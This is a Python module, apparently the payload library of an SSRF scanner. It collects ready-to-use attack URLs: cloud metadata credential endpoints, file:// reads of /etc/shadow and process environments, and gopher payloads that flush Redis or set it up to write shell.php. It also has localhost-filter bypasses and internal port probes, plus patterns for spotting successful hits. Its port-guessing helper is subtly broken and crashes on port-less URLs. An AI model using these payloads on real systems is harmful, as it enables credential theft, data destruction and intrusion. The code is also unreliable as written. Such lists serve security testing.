"""SSRF Payload 库 — 按目标服务类型和协议分类

覆盖范围:
1. 云元数据端点 (AWS / Alibaba Cloud / GCP / DigitalOcean / Oracle / Tencent)
2. 内部服务探测 (Redis / MySQL / SSH / Elasticsearch / Memcached / Docker)
3. 协议走私 (file / gopher / dict / ftp / netdoc)
4. 常见内网端口探测 URL
"""

# ========== 云元数据端点 ==========
CLOUD_METADATA_URLS = [
    # AWS / Generic
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # Alibaba Cloud (AliYun) ECS
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/instance-id",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    "http://100.100.100.200/2016-01-01/meta-data/",
    # Google Cloud Platform
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    "http://169.254.169.254/metadata/v1/id",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v1/vnics/",
    # Tencent Cloud
    "http://metadata.tencentyun.com/latest/meta-data/",
    "http://metadata.tencentyun.com/latest/meta-data/instance-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Kubernetes
    "http://169.254.169.254/latest/meta-data/kube-env",
    # OpenStack
    "http://169.254.169.254/openstack/latest/meta_data.json",
]

# ========== 内部服务探测 ==========
INTERNAL_SERVICE_URLS = [
    # Redis
    {"url": "http://127.0.0.1:6379/", "service": "Redis", "port": 6379},
    {"url": "http://localhost:6379/", "service": "Redis", "port": 6379},
    {"url": "http://0.0.0.0:6379/", "service": "Redis", "port": 6379},
    # MySQL
    {"url": "http://127.0.0.1:3306/", "service": "MySQL", "port": 3306},
    {"url": "http://localhost:3306/", "service": "MySQL", "port": 3306},
    # SSH
    {"url": "http://127.0.0.1:22/", "service": "SSH", "port": 22},
    # Elasticsearch
    {"url": "http://127.0.0.1:9200/", "service": "Elasticsearch", "port": 9200},
    {"url": "http://127.0.0.1:9200/_cluster/health", "service": "Elasticsearch", "port": 9200},
    {"url": "http://127.0.0.1:9200/_nodes", "service": "Elasticsearch", "port": 9200},
    # Memcached
    {"url": "http://127.0.0.1:11211/", "service": "Memcached", "port": 11211},
    # MongoDB
    {"url": "http://127.0.0.1:27017/", "service": "MongoDB", "port": 27017},
    # Docker
    {"url": "http://127.0.0.1:2375/containers/json", "service": "Docker", "port": 2375},
    {"url": "http://127.0.0.1:2376/containers/json", "service": "Docker", "port": 2376},
    # PostgreSQL
    {"url": "http://127.0.0.1:5432/", "service": "PostgreSQL", "port": 5432},
    # Consul
    {"url": "http://127.0.0.1:8500/v1/kv/?recurse", "service": "Consul", "port": 8500},
    # Etcd
    {"url": "http://127.0.0.1:2379/v2/keys/", "service": "Etcd", "port": 2379},
    # Zookeeper
    {"url": "http://127.0.0.1:2181/", "service": "Zookeeper", "port": 2181},
    # Hadoop / YARN
    {"url": "http://127.0.0.1:8088/cluster/nodes", "service": "YARN", "port": 8088},
    {"url": "http://127.0.0.1:50070/", "service": "HDFS", "port": 50070},
    # Jenkins
    {"url": "http://127.0.0.1:8080/", "service": "Jenkins", "port": 8080},
    {"url": "http://127.0.0.1:8080/script", "service": "Jenkins", "port": 8080},
    # Kibana
    {"url": "http://127.0.0.1:5601/", "service": "Kibana", "port": 5601},
    # Grafana
    {"url": "http://127.0.0.1:3000/", "service": "Grafana", "port": 3000},
    # Prometheus
    {"url": "http://127.0.0.1:9090/", "service": "Prometheus", "port": 9090},
    # RabbitMQ
    {"url": "http://127.0.0.1:15672/", "service": "RabbitMQ", "port": 15672},
    # Tomcat
    {"url": "http://127.0.0.1:8080/manager/html", "service": "Tomcat", "port": 8080},
    # php-fpm
    {"url": "http://127.0.0.1:9000/", "service": "PHP-FPM", "port": 9000},
]

# ========== 协议走私 Payload ==========
PROTOCOL_SMUGGLING_URLS = [
    # file 协议 — 读取本地文件
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///etc/issue",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/self/cwd",
    "file:///proc/1/environ",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
    # gopher 协议 — TCP 隧道攻击（常用于 Redis / MySQL / FastCGI）
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp/",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php",
    "gopher://127.0.0.1:6379/_SET%20test%20value",
    "gopher://127.0.0.1:3306/_",
    "gopher://127.0.0.1:11211/_stats",
    "gopher://127.0.0.1:22/_",
    # dict 协议 — 服务信息探测
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:6379/CONFIG%20GET%20dir",
    "dict://127.0.0.1:3306/",
    "dict://127.0.0.1:22/",
    "dict://127.0.0.1:9200/",
    "dict://127.0.0.1:11211/stats",
    # sftp / tftp
    "sftp://127.0.0.1:22/",
    "tftp://127.0.0.1:69/test",
    # ftp
    "ftp://127.0.0.1:21/",
    # jar (Java)
    "jar:http://127.0.0.1:6379/",
    # netdoc (Java)
    "netdoc:///etc/passwd",
]

# ========== 内部端口探测 URL（常见高危端口）==========
INTERNAL_PORT_URLS = [
    # Web 服务
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:8000/",
    "http://127.0.0.1:8001/",
    "http://127.0.0.1:8888/",
    "http://127.0.0.1:9090/",
    # 数据库
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:1433/",
    "http://127.0.0.1:1521/",
    # 管理面板
    "http://127.0.0.1:4848/",    # GlassFish
    "http://127.0.0.1:7001/",    # WebLogic
    "http://127.0.0.1:7002/",    # WebLogic SSL
    "http://127.0.0.1:9060/",    # WebSphere
    "http://127.0.0.1:9043/",    # WebSphere SSL
    "http://127.0.0.1:9990/",    # JBoss
    "http://127.0.0.1:50000/",   # SAP
    # 容器
    "http://127.0.0.1:2375/",    # Docker
    "http://127.0.0.1:2376/",    # Docker TLS
    "http://127.0.0.1:10250/",   # Kubelet
    "http://127.0.0.1:10255/",   # Kubelet read-only
    # 其他
    "http://127.0.0.1:8500/",    # Consul
    "http://127.0.0.1:2379/",    # Etcd
    "http://127.0.0.1:2181/",    # Zookeeper
    "http://127.0.0.1:11211/",   # Memcached
    "http://127.0.0.1:9000/",    # PHP-FPM
    "http://127.0.0.1:9001/",    # Supervisor
    "http://127.0.0.1:27015/",   # Games
]

# ========== 域名绕过 Payload（绕过对 127.0.0.1 / localhost 的黑名单）==========
BYPASS_DOMAIN_URLS = [
    # 十进制 IP 表示
    "http://2130706433/",         # 127.0.0.1 的十进制
    "http://0x7f000001/",         # 十六进制
    "http://0x7f.0.0.1/",         # 混合十六进制
    "http://0177.0.0.01/",        # 八进制
    "http://0x7f.0.0.0x1/",      # 混合表示
    # URL 解析混淆
    "http://127.0.0.1:6379@evil.com/",   # @ 混淆（认证部分）
    "http://evil.com@127.0.0.1:6379/",   # @ 混淆变体
    "http://evil.com#@127.0.0.1:6379/",  # Fragment 混淆
    "http://evil.com%23@127.0.0.1:6379/", # URL 编码的 #
    # DNS 重绑定 / 短链接（预置常见测试域名）
    "http://localtest.me:6379/",          # 解析到 127.0.0.1
    "http://spoofed.burpcollaborator.net/",
    "http://1.1.1.1@127.0.0.1:6379/",
    # IPv6
    "http://[::1]:6379/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]:6379/",  # IPv4-mapped IPv6
    # 中文域名 / Unicode
    "http://①②⑦.⓪.⓪.①:6379/",
    # nip.io 泛域名
    "http://127.0.0.1.nip.io:6379/",
]

# ========== 响应检测模式 ==========
# 云元数据响应特征
CLOUD_METADATA_PATTERNS = {
    "aws": [
        "ami-id",
        "instance-id",
        "instance-type",
        "security-groups",
        "local-hostname",
        "public-hostname",
        "placement",
        "kernel-id",
        "account-id",
        "reservation-id",
        "mac",
        "profile",
    ],
    "aliyun": [
        "instance-id",
        "image-id",
        "hostname",
        "region-id",
        "zone-id",
        "mac",
        "vpc-id",
        "eipv4",
        "ram",
        "ECS",
    ],
    "gcp": [
        "service-accounts",
        "google",
        "computeMetadata",
        "attached-disks",
        "disks/",
        "hostname",
    ],
    "azure": [
        "azEnvironment",
        "location",
        "resourceGroupName",
        "vmId",
    ],
    "tencent": [
        "instance-name",
        "instance-id",
        "uuid",
        "app-id",
    ],
    "digitalocean": [
        "droplet_id",
        "region",
        "features",
    ],
    "oracle": [
        "canonicalRegionName",
        "definedTags",
        "displayName",
    ],
    "kubernetes": [
        "kube-env",
        "kubelet",
        "serviceaccount",
    ],
    "openstack": [
        "openstack",
        "meta_data.json",
        "availability_zone",
    ],
}

# Redis 响应特征
REDIS_RESPONSE_PATTERNS = [
    "-ERR",
    "+PONG",
    "+OK",
    "redis_version",
    "redis_mode",
    "redis_git_sha1",
    "os:",
    "arch_bits:",
    "connected_clients:",
    "uptime_in_seconds:",
]

# Elasticsearch 响应特征
ELASTICSEARCH_PATTERNS = [
    '"cluster_name"',
    '"cluster_uuid"',
    '"number"',
    '"node_name"',
    '"version"',
    '"lucene_version"',
    '"tagline"',
]

# MySQL 响应特征
MYSQL_RESPONSE_PATTERNS = [
    "mysql_native_password",
    "caching_sha2_password",
    "hostname is not allowed",
    "Access denied for user",
]

# SSH 响应特征
SSH_RESPONSE_PATTERNS = [
    "SSH-2.0-",
    "OpenSSH",
    "Protocol mismatch",
]

# Memcached 响应特征
MEMCACHED_PATTERNS = [
    "STAT pid",
    "STAT uptime",
    "STAT version",
    "STAT curr_items",
]

# Docker 响应特征
DOCKER_PATTERNS = [
    '"Id":',
    '"Names":[',
    '"Image":',
    '"State":',
    '"Status":',
    '"Created":',
]

# 文件读取响应特征
FILE_READ_PATTERNS = {
    "passwd": [
        "root:",
        "daemon:",
        "bin:",
        "nobody:",
        "/bin/bash",
        "/sbin/nologin",
    ],
    "hosts": [
        "127.0.0.1",
        "localhost",
        "::1",
    ],
    "winini": [
        "[fonts]",
        "[extensions]",
        "[files]",
        "[Mail]",
    ],
}

# MongoDB 响应特征
MONGODB_PATTERNS = [
    "It looks like you are trying to access MongoDB",
    "MongoDB HTTP",
    "You are trying to access MongoDB",
]


def get_ssrf_payloads() -> list[dict]:
    """获取所有 SSRF Payload（按优先级排序）

    Returns:
        列表，每个元素为 {"url": str, "category": str, "target": str, "port": int|None}
    """
    payloads = []

    # 云元数据端点 (最高优先级)
    for url in CLOUD_METADATA_URLS:
        payloads.append({
            "url": url,
            "category": "cloud_metadata",
            "target": _guess_cloud_provider(url),
            "port": 80,
        })

    # 内部服务
    for item in INTERNAL_SERVICE_URLS:
        payloads.append({
            "url": item["url"],
            "category": "internal_service",
            "target": item["service"],
            "port": item["port"],
        })

    # 协议走私
    for url in PROTOCOL_SMUGGLING_URLS:
        payloads.append({
            "url": url,
            "category": "protocol_smuggling",
            "target": _guess_protocol_target(url),
            "port": _guess_protocol_port(url),
        })

    # 端口探测
    for url in INTERNAL_PORT_URLS:
        payloads.append({
            "url": url,
            "category": "port_probe",
            "target": "internal",
            "port": _extract_port(url),
        })

    # 绕过域名
    for url in BYPASS_DOMAIN_URLS:
        payloads.append({
            "url": url,
            "category": "bypass",
            "target": "redis_bypass",
            "port": 6379,
        })

    return payloads


def get_cloud_metadata_urls() -> list[str]:
    """获取云元数据端点 URL 列表"""
    return CLOUD_METADATA_URLS


def get_internal_service_urls() -> list[dict]:
    """获取内部服务探测 URL 列表"""
    return INTERNAL_SERVICE_URLS


def get_protocol_smuggling_urls() -> list[str]:
    """获取协议走私 URL 列表"""
    return PROTOCOL_SMUGGLING_URLS


def get_bypass_domain_urls() -> list[str]:
    """获取域名绕过 Payload 列表"""
    return BYPASS_DOMAIN_URLS


def detect_cloud_metadata(text: str) -> dict | None:
    """检测响应中是否包含云元数据

    Args:
        text: HTTP 响应正文

    Returns:
        如果检测到云元数据，返回 {"provider": "aws|aliyun|...", "evidence": str}，否则 None
    """
    for provider, patterns in CLOUD_METADATA_PATTERNS.items():
        matched = [p for p in patterns if p.lower() in text.lower()]
        if matched:
            return {
                "provider": provider,
                "evidence": f"匹配到 {provider} 元数据特征: {', '.join(matched[:5])}",
            }
    return None


def detect_internal_service(text: str) -> dict | None:
    """检测响应中是否包含内部服务标识

    Args:
        text: HTTP 响应正文

    Returns:
        如果检测到内部服务，返回 {"service": str, "evidence": str}，否则 None
    """
    checks = [
        ("Redis", REDIS_RESPONSE_PATTERNS),
        ("Elasticsearch", ELASTICSEARCH_PATTERNS),
        ("MySQL", MYSQL_RESPONSE_PATTERNS),
        ("SSH", SSH_RESPONSE_PATTERNS),
        ("Memcached", MEMCACHED_PATTERNS),
        ("Docker", DOCKER_PATTERNS),
        ("MongoDB", MONGODB_PATTERNS),
    ]

    for service_name, patterns in checks:
        matched = [p for p in patterns if p.lower() in text.lower() or p in text]
        if matched:
            return {
                "service": service_name,
                "evidence": f"匹配到 {service_name} 响应特征: {', '.join(matched[:5])}",
            }
    return None


def detect_file_read(text: str) -> dict | None:
    """检测响应中是否包含文件读取结果

    Args:
        text: HTTP 响应正文

    Returns:
        如果检测到文件内容，返回 {"file_type": str, "evidence": str}，否则 None
    """
    for file_type, patterns in FILE_READ_PATTERNS.items():
        matched = [p for p in patterns if p.lower() in text.lower() or p in text]
        if len(matched) >= 2:  # 需要至少匹配 2 个特征才确认
            return {
                "file_type": file_type,
                "evidence": f"匹配到 {file_type} 文件内容特征: {', '.join(matched[:5])}",
            }
    return None


# ====== 辅助函数 ======

def _guess_cloud_provider(url: str) -> str:
    """根据 URL 猜测云服务商"""
    url_lower = url.lower()
    if "100.100.100.200" in url_lower:
        return "aliyun"
    if "google.internal" in url_lower or "computeMetadata" in url_lower:
        return "gcp"
    if "tencentyun" in url_lower:
        return "tencent"
    if "oracle" in url_lower or "opc/" in url_lower:
        return "oracle"
    if "digitalocean" in url_lower:
        return "digitalocean"
    if "azure" in url_lower:
        return "azure"
    if "openstack" in url_lower:
        return "openstack"
    if "kube" in url_lower:
        return "kubernetes"
    return "aws"  # 默认 AWS (169.254.169.254)


def _guess_protocol_target(url: str) -> str:
    """根据协议走私 URL 猜测目标服务"""
    url_lower = url.lower()
    if ":6379" in url_lower:
        return "Redis"
    if ":3306" in url_lower:
        return "MySQL"
    if ":11211" in url_lower:
        return "Memcached"
    if ":22" in url_lower:
        return "SSH"
    if ":9200" in url_lower:
        return "Elasticsearch"
    if "file://" in url_lower:
        return "File System"
    if "netdoc://" in url_lower:
        return "File System (Java)"
    return "Unknown"


def _guess_protocol_port(url: str) -> int | None:
    """从 URL 中提取端口号"""
    import re
    match = re.search(r':(\d{2,5})[/\?]|$', url)
    if match:
        return int(match.group(1))
    return None


def _extract_port(url: str) -> int | None:
    """从 URL 中提取端口号"""
    import re
    match = re.search(r':(\d+)/?', url)
    if match:
        return int(match.group(1))
    if "https://" in url:
        return 443
    if "http://" in url:
        return 80
    return None
